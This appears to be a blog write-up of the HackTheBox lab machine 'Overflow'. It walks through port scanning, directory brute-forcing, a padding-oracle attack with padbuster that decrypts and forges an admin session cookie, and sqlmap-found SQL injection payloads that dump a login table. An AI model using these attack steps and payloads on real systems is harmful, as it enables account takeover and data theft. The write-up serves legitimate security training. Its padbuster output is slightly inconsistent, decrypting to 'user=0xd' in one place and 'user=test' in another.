[Back to Main Page](../index.html) 

# Overflow on HackTheBox

![htb](https://www.yeahhub.com/wp-content/uploads/2018/03/hackthebox.png)

## Introduction

It has been quite some time until I have done my last challenge on HTB. Overflow is an older box which requires a cookie analysis and more. Once again, I had booted up Kali, but did not have any strategies just yet.

This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work. The tools come with a stock Kali installation, unless otherwise mentioned.

## 1. Initial Scanning

The first thing we try and as usual is a very basic nmap scan.

```
nmap 10.10.11.119
Nmap scan report for 10.10.11.119
Host is up (0.12s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
```

With further port scans on the ports we receive this information:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Overflow Sec
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SMTP is open, which means we might be able to bruteforce usernames, or send emails. A quick google search on the Apache and SSH versions will tell us that the host is likely running Ubuntu 18.04 Bionic.

Next, we will be looking into the webpage itself. There's not much there other than 'Sign In' and 'Sign Up' links, and a 'Contact Us' form at the bottom. Submitting the 'Contact Us' form just sends a GET to /?, so it doesn't do anything important. But the login redirects to `/login.php` and signup to `/register.php`.

![login](https://i.imgur.com/AkuQ67a.png)

Playing a round with both masks, there was no quick solution to get through these with simple injections. Unfortunately, there was no way to enumerate the usernames through checking the error messages in the login mask, but there is a different approach. Trying to register as admin will return to the registration.php, whereas any successful registration gets a 302: This means we are able to enumerate the users this way.

Next, we register an account, which redirects back to `/home/index.php`, the front page. It is very similar to the page before, but the menu offers various options instead. 

![menu](https://i.imgur.com/dVdkApn.png)

There is also a profile page at `/home/profile/`, but the buttons there do visibly not work.

![profile](https://i.imgur.com/ZVzBYzM.png)

`/home/blog.php` has four different posts, but the links do not work once again. Other than that, there is also the `/logout.php`, which deletes the auth cookie and returns a 302 to the homepage.

```
HTTP/1.1 302 Found
Date: Mon, 27 Sep 2021 20:27:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: auth=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0
Location: index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

Further investigating the cookie behavior, we will spot that it is using a Base-64 encryption. Everything else looks pretty normal.

```
Set-Cookie: auth=%2BV8hGOLZMNZVo81T4JCViBrSlRK1Kyof
```

Interesting enough, the cookie size does change with the username length. Using a quick script (the original written by Oxdf), we will be able to confirm this and the encryption.

```python
#!/usr/bin/env python3

import random
import requests
import string
from base64 import b64decode
from urllib.parse import unquote


url = "http://10.10.11.119/register.php"

prev = 0
print(f'Name len   base64 c len   raw c len')
for i in range(1, 50):
    name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(i))
    resp = requests.post(url, data={"username": name, "password": "aaaaa", "password2": "aaaaa"}, allow_redirects=False)
    b64_cookie = unquote(resp.cookies["auth"])
    raw_cookie = b64decode(b64_cookie)
    if len(b64_cookie) != prev:
        print(f'{len(name):^8}   {len(b64_cookie):^12}   {len(raw_cookie):^9}')
        prev = len(b64_cookie)
```

This script will loop from 1 to 50, creating a random string the username, and eventually fetching the cookie that is set as a result. It decodes the cookie, and checks the length. If it is different from the previous one, things will be printed as well as the length of the base64-decoded cookie.

```
ratcode404@kali$ python test_cookie.py 
Name len   base64 c len   raw c len
   1            24           16    
   3            32           24    
   11           44           32    
   19           56           40    
   27           64           48    
   35           76           56    
   43           88           64
   ```
With this information we are able to spot that the username must be included in the cookie, and that there is some kind of block cipher being used to encrypt the data. The block size should be 8, considering the jumps in the raw cookie length. Interestingly, every time we log on with the same user the cookie changes; which could be an indication that they are using an IV for the encryption. 

With all this information we can guess the structure of the cookie. There has to be padding, which needs to be eight bytes, same for the IV. Choosing a three character username, the cookie jumps to 24 bytes. 8 bytes IV, 8 padding, 3 the username. That leaves five bytes of static data in the cookie, probably something like `user=` or `name=`.

Next, we will try to directory bruteforce the .php. We will use feroxbuster, and include -x php since.

```
ratcode404@kali$ feroxbuster -u http://10.10.11.119 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.119
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       54l      104w     2017c http://10.10.11.119/login.php
302        0l        0w        0c http://10.10.11.119/logout.php
200       55l      113w     2198c http://10.10.11.119/register.php
301        9l       28w      313c http://10.10.11.119/config
301        9l       28w      311c http://10.10.11.119/home
200       99l      273w     3076c http://10.10.11.119/home/blog.php
200        1l        1w       14c http://10.10.11.119/home/logs.php
200        0l        0w        0c http://10.10.11.119/config/db.php
200      299l      904w        0c http://10.10.11.119/index.php
200        0l        0w        0c http://10.10.11.119/config/users.php
200        0l        0w        0c http://10.10.11.119/config/auth.php
301        9l       28w      319c http://10.10.11.119/home/profile
302      290l      889w        0c http://10.10.11.119/home/index.php
302       69l      126w     2503c http://10.10.11.119/home/profile/index.php
403        9l       28w      277c http://10.10.11.119/server-status
[####################] - 4m    239992/239992  0s      found:15      errors:278    
[####################] - 4m     59998/59998   243/s   http://10.10.11.119
[####################] - 4m     59998/59998   245/s   http://10.10.11.119/config
[####################] - 4m     59998/59998   246/s   http://10.10.11.119/home
[####################] - 4m     59998/59998   238/s   http://10.10.11.119/home/profile
```

Cool, let's check the results. The pages in `/config` return empty responses (as feroxbuster shows, 0 lines, 0 words). `/home/logs.php` returns a 200 with just a body of Unauthorized. That will not help for now.

Instead, we may be able to use the available paddding information of the cookie.  We will use padbuster to automate a bruteforcing method across the bytes to receive the decrypted plaintext. Here, we will add a valid cookie, the block size and to pass the item as a cookie.

```
ratcode404@kali$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 16378

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     16378   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended:
```

In this case, number 1 returns a 200 (the page) for one of the cookies, and number 2 returns a 302 to `logout.php` for the other 255 cookies. We choose '2' and it will continue brute-forcing the bytes of the cookie to get the plaintext.

```
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (188/256) [Byte 8]
[+] Success: (89/256) [Byte 7]
[+] Success: (24/256) [Byte 6]
[+] Success: (168/256) [Byte 5]
[+] Success: (78/256) [Byte 4]
[+] Success: (174/256) [Byte 3]
[+] Success: (73/256) [Byte 2]
[+] Success: (18/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 5b4f1f86ec7e9568
[+] Intermediate Bytes (HEX): e6b054b75ceba545
[+] Plain Text: user=0xd

*** Starting Block 2 of 2 ***

[+] Success: (146/256) [Byte 8]
[+] Success: (112/256) [Byte 7]
[+] Success: (134/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (124/256) [Byte 4]
[+] Success: (226/256) [Byte 3]
[+] Success: (177/256) [Byte 2]
[+] Success: (203/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): c7dce25292e93514
[+] Intermediate Bytes (HEX): 3d481881eb79926f
[+] Plain Text: f

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=test

[+] Decrypted value (HEX): 757365723D3078646607070707070707

[+] Decrypted value (Base64): dXNlcj0weGRmBwcHBwcHBw==

-------------------------------------------------------
```

Here we go. The decrypted ASCII value is of the form `user=[username]` Now, knowing what the underlying plaintext looks like, we can run it again with -plain user=admin to get back a valid cookie with that plaintext.

`ratcode404@kali$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU -plaintext user=admin`

Awesome, this is the result.

```
-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
-------------------------------------------------------
```

When we use this cookie and refresh the browser, we have a new option 'Admin Panel'. 

![adminmenu](https://i.imgur.com/oWczMcI.png)

This panel leads to `http://10.10.11.119/admin_cms_panel/admin/login.php`, which is the login for a CMS instance.

![cms](https://i.imgur.com/Jj39k1v.png)

We will need to figure the admin login for the CMS, even though we have admin access to the main page already. The Logs link leads to `http://10.10.11.119/home/index.php#popup1`, which creates a popup.

![undefined](https://i.imgur.com/MnoBr3v.png)

Finally able to preview, there is one thing that appears very different with admin access: `http://overflow.htb/home/logs.php?name=admin`

![overflow](https://i.imgur.com/G8PIHrf.png)

It fails as we do not have the domain for this, so we instead add it to /etc/hosts. Next I switch over to this page and access the data returned.

```
HTTP/1.1 200 OK
Date: Tue, 28 Sep 2021 17:21:32 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 235
Connection: close
Content-Type: text/html; charset=UTF-8

<div id='last'>Last login : 10:00:00</div><br> <div id='last'>Last login : 11:00:00</div><br> <div id='last'>Last login : 12:00:00</div><br> <div id='last'>Last login : 14:00:00</div><br> <div id='last'>Last login : 16:00:00</div><br>
```

Or by clicking on 'Logs'.

![logsadmin](https://i.imgur.com/wtZAGOg.png)

We can play around with Burp Reaper and hopefully figure out more. When we use `admin'` a 500 Internal Server Error is returned. This response is a great sign ofor a potential SQL injection. 

```
ratcode404@kali$ sqlmap -r logs.php.request
...[snip]...
[13:49:55] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
---
Parameter: name (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=admin') AND 1081=1081 AND ('fFTi'='fFTi

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: name=admin') OR (SELECT 8283 FROM (SELECT(SLEEP(5)))Uyda) AND ('jpVt'='jpVt

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: name=admin') UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7171,0x42676d6d686b6b5452657553507950506a6f6e62636662536d796450626944475270784f62646e4a,0x71717a7071)-- -
---
[13:51:32] [INFO] the back-end DBMS is MySQL
[13:51:32] [CRITICAL] unable to connect to the target URL ('Broken pipe'). sqlmap is going to retry the request(s)
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
...[snip]...
```

`sqlmap -r logs.php.request -D logs --tables` displays one table, called userlog.  
`sqlmap -r logs.php.request -D logs -T userlog --dump` shows all the logins. 

```
Database: logs
Table: userlog
[12 entries]
+----+----------+-----------+
| id | USERNAME | Lastlogin |
+----+----------+-----------+
| 1  | admin    | 11:00:00  |
| 2  | editor   | 10:00:00  |
| 3  | Mark     | 13:00:00  |
| 4  | Diana    | 15:00:00  |
| 5  | Tester   | 16:00:00  |
| 6  | super    | 20:00:00  |
| 7  | frost    | 08:00:00  |
| 8  | Corp     | 10:00:00  |
| 9  | admin    | 14:00:00  |
| 10 | admin    | 16:00:00  |
| 11 | admin    | 10:00:00  |
| 12 | admin    | 12:00:00  |
+----+----------+-----------+
```

